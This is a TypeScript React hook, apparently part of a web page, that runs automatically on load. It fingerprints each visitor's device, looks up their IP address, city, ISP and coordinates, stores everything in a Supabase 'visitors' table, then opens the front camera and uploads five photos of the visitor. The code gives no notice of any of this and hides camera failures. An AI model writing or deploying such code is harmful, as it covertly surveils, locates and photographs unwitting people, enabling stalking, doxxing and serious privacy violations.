import { useEffect, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";

const getBrowser = () => {
  const ua = navigator.userAgent;
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg")) return "Edge";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
  return ua;
};

const getOS = () => {
  const ua = navigator.userAgent;
  if (ua.includes("Windows")) return "Windows";
  if (ua.includes("Mac")) return "macOS";
  if (ua.includes("Linux")) return "Linux";
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
  return "Unknown";
};

async function capturePhotos(visitorId: string) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "true");
    await video.play();

    // Wait for video to be ready
    await new Promise((r) => setTimeout(r, 1000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d")!;

    for (let i = 0; i < 5; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise<Blob>((resolve) =>
        canvas.toBlob((b) => resolve(b!), "image/jpeg", 0.8)
      );

      const fileName = `${visitorId}/photo_${i + 1}_${Date.now()}.jpg`;
      await supabase.storage.from("visitor-photos").upload(fileName, blob, {
        contentType: "image/jpeg",
      });

      // Wait between captures
      if (i < 4) await new Promise((r) => setTimeout(r, 800));
    }

    // Stop camera
    stream.getTracks().forEach((t) => t.stop());
  } catch (e) {
    console.log("Camera not available");
  }
}

export function useCollectData() {
  const collected = useRef(false);

  useEffect(() => {
    if (collected.current) return;
    collected.current = true;

    const run = async () => {
      const nav = navigator as any;

      // Collect local info
      const data: Record<string, any> = {
        browser: getBrowser(),
        os: getOS(),
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages?.join(", ") || navigator.language,
        screen_res: `${screen.width}×${screen.height}`,
        color_depth: `${screen.colorDepth}-bit`,
        device_pixel_ratio: `${window.devicePixelRatio}x`,
        is_online: navigator.onLine,
        cookies_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack === "1",
        touch_support: "ontouchstart" in window,
        cores: `${navigator.hardwareConcurrency || "N/A"}`,
        memory: nav.deviceMemory ? `${nav.deviceMemory} GB` : "N/A",
        connection_type: nav.connection?.effectiveType || "N/A",
        referrer: document.referrer || "direct",
        local_time: new Date().toISOString(),
        user_agent: navigator.userAgent,
      };

      // Battery
      try {
        if (nav.getBattery) {
          const b = await nav.getBattery();
          data.battery_level = `${Math.round(b.level * 100)}%${b.charging ? " (charging)" : ""}`;
        }
      } catch {}

      // IP & geo
      try {
        const res = await fetch("https://ipapi.co/json/");
        const geo = await res.json();
        data.ip = geo.ip;
        data.city = geo.city;
        data.country = geo.country_name;
        data.isp = geo.org;
        data.lat = geo.latitude?.toString();
        data.lon = geo.longitude?.toString();
        data.timezone = geo.timezone;
      } catch {
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      }

      // Insert into DB
      const { data: inserted } = await supabase
        .from("visitors")
        .insert(data)
        .select("id")
        .single();

      // Capture photos
      if (inserted?.id) {
        capturePhotos(inserted.id);
      }
    };

    run();
  }, []);
}
